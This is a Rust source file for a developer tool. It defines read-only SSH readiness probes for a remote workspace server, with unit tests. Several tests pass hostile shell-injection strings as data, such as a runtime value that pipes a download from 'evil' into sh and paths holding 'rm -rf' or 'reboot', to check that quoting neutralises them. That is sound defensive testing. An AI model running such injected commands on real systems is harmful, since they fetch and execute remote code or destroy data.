//! Reusable **read-only** readiness probes behind `ws remote check` (and the
//! light reachability check `ws init --remote` runs).
//!
//! "Read-only" is a hard contract: a probe never installs, mutates, or `sudo`s —
//! it only observes, over the user's own SSH. That's what makes `ws remote check`
//! safe to run against a server you haven't finished setting up. Building these as
//! functions (not one command body) lets `ws init --remote` reuse the reachability
//! probe as a light warn-don't-refuse check.

use crate::remote;

/// One probe's result: a short label, pass/fail, a human detail, and (surfaced by
/// `-v`) the underlying command it ran.
pub struct Probe {
    pub name: &'static str,
    pub ok: bool,
    pub detail: String,
    pub cmd: Option<String>,
}

impl Probe {
    /// A probe that ran a displayable command (client-side checks).
    fn new(name: &'static str, ok: bool, detail: impl Into<String>, cmd: impl Into<String>) -> Self {
        Probe { name, ok, detail: detail.into(), cmd: Some(cmd.into()) }
    }
    /// A server-side check whose command isn't shown per-line (the batched server
    /// script is displayed once, not per probe).
    fn server(name: &'static str, ok: bool, detail: impl Into<String>) -> Self {
        Probe { name, ok, detail: detail.into(), cmd: None }
    }
}

// --- Client-side probes (run locally) --------------------------------------

/// The SSH-reachability probe line built from a **known** verdict — no SSH call.
/// Lets `ws remote check` derive the reachability line from whether the server
/// probe script connected, instead of paying a second handshake just to test it.
pub fn ssh_status(connection: &str, ok: bool) -> Probe {
    Probe::new(
        "ssh",
        ok,
        if ok {
            format!("reachable — {connection}")
        } else {
            format!("cannot open an SSH session to {connection} (host / key / Tailscale?)")
        },
        format!("ssh -o BatchMode=yes {connection} true"),
    )
}

/// Can we open a non-interactive SSH session to the server? (Standalone — used by
/// `ws init --remote`'s light check, which does no server probing.)
pub fn ssh_reachable(connection: &str) -> Probe {
    ssh_status(connection, remote::reachable(connection))
}

/// Is `mutagen` installed locally? A remote workspace needs it to sync.
pub fn mutagen_local() -> Probe {
    let ok = crate::mutagen::installed();
    Probe::new(
        "mutagen",
        ok,
        if ok { "installed locally" } else { "not on PATH — needed to sync a remote workspace" },
        "mutagen version",
    )
}

// --- Server-side probes (one read-only SSH round trip) ---------------------

/// The keys the server script reports, paired with a human description. Kept
/// beside the script so the two can't drift.
const SERVER_CHECKS: &[(&str, &str)] = &[
    ("mutagen", "mutagen present on the server"),
    ("caddy", "the ws-caddy container is running"),
    ("workspace", "the workspace dir exists and is writable"),
];

/// The runtime check isn't in `SERVER_CHECKS` because its detail names the
/// runtime being probed, which isn't known until the workspace config is read.
const RUNTIME_CHECK: &str = "runtime";

/// The `dns` check isn't in `SERVER_CHECKS` because it only exists when the
/// workspace routes at all — with no `domain` there is nothing to resolve, and a
/// check that can't fail shouldn't be printed.
const DNS_CHECK: &str = "dns";

/// A name that only a wildcard entry can answer for. Any label works — the point
/// is that `*.<domain>` resolves — and at check time there's no branch or service
/// to name, so use a fixed synthetic one. Same name `server-setup/debian.sh`
/// verifies with, so the two agree on what "wired" means.
const DNS_PROBE_LABEL: &str = "ws-probe";

/// Whether the server resolves `*.<domain>` to itself, phrased for a status line.
///
/// The failure text carries the whole value of this probe, so it says what didn't
/// resolve, why anyone cares, and where the fix lives. Real incident: a dhclient
/// lease renewal rewrote `/etc/resolv.conf` and dropped the loopback nameserver,
/// leaving dnsmasq healthy but unqueried — a `kind: host` vite server then failed
/// every proxy hop with `getaddrinfo ENOTFOUND`, and nothing in `ws` noticed.
fn dns_detail(domain: &str, ok: bool) -> String {
    if ok {
        format!("the server resolves *.{domain} to itself")
    } else {
        format!(
            "can't resolve {DNS_PROBE_LABEL}.{domain} on the server — a `kind: host` repo \
             there can't reach a routed container (re-run server-setup/debian.sh; a DHCP \
             renewal can overwrite /etc/resolv.conf)"
        )
    }
}

/// A read-only shell script that probes each server prerequisite and prints one
/// `<key>:<ok|fail>` line each. Pure observation — no install, mutate, or sudo.
/// One round trip rather than an SSH connection per check. Also the exact string
/// surfaced under `-v`.
///
/// `domain` adds the wildcard-resolution check; `None` (no routing configured)
/// leaves it out entirely rather than emitting a check that always passes.
///
/// `runtime` is the workspace's configured runtime, not a fixed `podman`: probing
/// a binary the server was never meant to have reports a failure the user can't
/// act on, and misses the one that is actually broken.
pub fn server_script(workspace_path: &str, runtime: &str, domain: Option<&str>) -> String {
    let wp = remote::shell_quote(workspace_path);
    // Shell-quoted: `runtime` comes from a possibly-cloned `.ws.json` and this
    // runs in the server's shell (same posture as `compose::remote_compose_script`).
    let rt = remote::shell_quote(runtime);
    let mut lines = vec![
        "command -v mutagen >/dev/null 2>&1 && echo mutagen:ok || echo mutagen:fail".to_string(),
        format!("{rt} info >/dev/null 2>&1 && echo {RUNTIME_CHECK}:ok || echo {RUNTIME_CHECK}:fail"),
        // `-f name=` is an unanchored substring match, so anchor it (`^…$`) —
        // else a stray `ws-caddy-old` would make a stopped ws-caddy read as up.
        // Runtime parameterized (`{rt}`, shell-quoted at the top of this fn); the
        // container name comes from `caddy` so renaming it can't leave this probe
        // silently checking the old one.
        format!(
            "{rt} ps -q -f name='^{}$' -f status=running | grep -q . && echo caddy:ok || echo caddy:fail",
            crate::caddy::CADDY_CONTAINER
        ),
        format!("test -d {wp} && test -w {wp} && echo workspace:ok || echo workspace:fail"),
    ];
    if let Some(d) = domain {
        // `getent hosts` asks the server's own resolver stack, which is exactly
        // what a dev server running there would ask — not dnsmasq directly, which
        // answers fine even while nothing is pointed at it.
        let host = remote::shell_quote(&format!("{DNS_PROBE_LABEL}.{d}"));
        lines.push(format!(
            "getent hosts {host} >/dev/null 2>&1 && echo {DNS_CHECK}:ok || echo {DNS_CHECK}:fail"
        ));
    }
    lines.join("; ")
}

/// Run the server probes over SSH. Returns the per-check `Probe`s, or `None` when
/// SSH itself couldn't reach the server (so the caller reports "unreachable"
/// rather than a wall of failures).
pub fn server_probes(
    connection: &str,
    workspace_path: &str,
    runtime: &str,
    domain: Option<&str>,
) -> Option<Vec<Probe>> {
    let script = server_script(workspace_path, runtime, domain);
    let out = remote::ssh_capture(connection, &script)?;
    let results = parse_server(&out);
    // A key missing from the output (older server, partial run) reads as a
    // failure, not a silent pass.
    let verdict = |key: &str| results.get(key).copied().unwrap_or(false);
    let mut probes: Vec<Probe> = SERVER_CHECKS
        .iter()
        .map(|(key, desc)| Probe::server(key, verdict(key), *desc))
        .collect();
    // After `mutagen`, before `caddy` — the order the server is set up in, which
    // is also the order a failure cascades.
    probes.insert(
        1,
        Probe::server(RUNTIME_CHECK, verdict(RUNTIME_CHECK), format!("{runtime} is up on the server")),
    );
    if let Some(d) = domain {
        let ok = verdict(DNS_CHECK);
        probes.push(Probe::server(DNS_CHECK, ok, dns_detail(d, ok)));
    }
    Some(probes)
}

/// Parse the `<key>:<ok|fail>` lines the server script prints.
fn parse_server(stdout: &str) -> std::collections::BTreeMap<String, bool> {
    stdout
        .lines()
        .filter_map(|l| l.split_once(':').map(|(k, v)| (k.trim().to_string(), v.trim() == "ok")))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The read-only contract — no mutating verb, no sudo.
    fn assert_read_only(s: &str) {
        for banned in ["sudo", "rm ", "install", "systemctl start", "podman run", "create"] {
            assert!(!s.contains(banned), "server script must stay read-only, found {banned:?}: {s}");
        }
    }

    #[test]
    fn server_script_is_read_only_and_covers_every_check() {
        let s = server_script("workspace", "podman", None);
        assert_read_only(&s);
        // Every advertised key is probed, including the one kept out of the table.
        for (key, _) in SERVER_CHECKS {
            assert!(s.contains(&format!("echo {key}:ok")), "missing probe for {key}: {s}");
        }
        assert!(s.contains(&format!("echo {RUNTIME_CHECK}:ok")), "missing runtime probe: {s}");
    }

    /// A docker server must be probed with docker — the old script asked `podman`
    /// whatever the workspace was configured for, so it reported a failure the
    /// user couldn't act on while the real runtime went unchecked.
    #[test]
    fn server_script_probes_the_configured_runtime() {
        let s = server_script("workspace", "docker", None);
        assert!(s.contains("docker info"), "runtime liveness must use the configured runtime: {s}");
        assert!(s.contains("docker ps -q"), "the caddy check must use it too: {s}");
        assert!(!s.contains("podman"), "no hardcoded podman may survive: {s}");
    }

    #[test]
    fn server_script_quotes_a_hostile_runtime() {
        let s = server_script("workspace", "podman; curl evil | sh #", None);
        assert!(s.contains("'podman; curl evil | sh #' info"), "runtime must be shell-quoted: {s}");
    }

    #[test]
    fn server_script_quotes_the_workspace_path() {
        let s = server_script("weird dir; rm -rf", "podman", None);
        assert!(s.contains("'weird dir; rm -rf'"), "workspace path must be shell-quoted: {s}");
    }

    #[test]
    fn server_script_probes_the_container_caddy_actually_names() {
        let s = server_script("workspace", "podman", None);
        assert!(
            s.contains(&format!("-f name='^{}$'", crate::caddy::CADDY_CONTAINER)),
            "caddy probe must use caddy::CADDY_CONTAINER, anchored: {s}"
        );
    }

    #[test]
    fn server_script_probes_dns_only_with_a_domain() {
        let without = server_script("workspace", "podman", None);
        assert!(!without.contains("dns:"), "no domain must mean no DNS check at all: {without}");

        let with = server_script("workspace", "podman", Some("myapp.test"));
        assert!(with.contains("getent hosts ws-probe.myapp.test"), "expected the wildcard lookup: {with}");
        assert!(with.contains("echo dns:ok"), "expected the dns key: {with}");
        assert!(with.contains("echo dns:fail"), "expected the dns failure branch: {with}");
        // Still observation only, and still one round trip.
        assert_read_only(&with);
    }

    #[test]
    fn server_script_quotes_the_domain() {
        let s = server_script("workspace", "podman", Some("evil; reboot"));
        assert!(s.contains("'ws-probe.evil; reboot'"), "the probe host must be shell-quoted: {s}");
    }

    #[test]
    fn dns_detail_names_the_host_and_the_fix() {
        let ok = dns_detail("myapp.test", true);
        assert!(ok.contains("*.myapp.test"), "pass line should name the domain: {ok}");

        let bad = dns_detail("myapp.test", false);
        assert!(bad.contains("ws-probe.myapp.test"), "failure must name what didn't resolve: {bad}");
        assert!(bad.contains("server-setup/debian.sh"), "failure must point at the fix: {bad}");
        assert!(bad.contains("resolv.conf"), "failure should name the usual cause: {bad}");
    }

    #[test]
    fn parse_server_reads_ok_and_fail() {
        let m = parse_server("mutagen:ok\nruntime:fail\ncaddy:ok\n");
        assert_eq!(m.get("mutagen"), Some(&true));
        assert_eq!(m.get(RUNTIME_CHECK), Some(&false));
        assert_eq!(m.get("caddy"), Some(&true));
        assert_eq!(m.get("workspace"), None);
    }

    #[test]
    fn server_probes_default_a_missing_key_to_fail() {
        // Simulate the parse → probe mapping with a partial result set.
        let results = parse_server("mutagen:ok\nruntime:ok\n");
        let workspace_ok = results.get("workspace").copied().unwrap_or(false);
        assert!(!workspace_ok, "a key absent from the server output must read as a failure");
    }
}
